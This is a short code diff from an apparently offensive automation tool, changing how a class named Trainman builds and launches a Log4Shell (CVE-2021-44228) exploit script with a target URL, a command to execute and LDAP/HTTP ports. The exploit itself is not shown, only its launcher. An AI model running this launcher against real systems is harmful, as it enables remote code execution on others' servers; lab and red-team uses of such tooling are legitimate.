@@ -352,14 +352,19 @@ class Trainman:
         exploit_cve_2021_44228_cmd = [
             'python3',
             '/L4sh/main.py',
-            f'-i {self.host_info[2]}',
-            f'-u {target_url}',
-            f'-c {exec_cmd}',
-            f'-p {http_port}',
-            f'-l {ldap_port}'
+            '-i', f'{self.host_info[2]}',
+            '-u', f'{target_url}',
+            '-c', f'{exec_cmd}',
+            '-p', f'{http_port}',
+            '-l', f'{ldap_port}'
         ]
         exploit_cve_2021_44228 = subprocess.Popen(
-            exploit_cve_2021_44228_cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE
+            exploit_cve_2021_44228_cmd,
+            stdin=subprocess.PIPE,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            env=env,
+            cwd=r'/L4sh'
         )
         counter = 1
         output = None
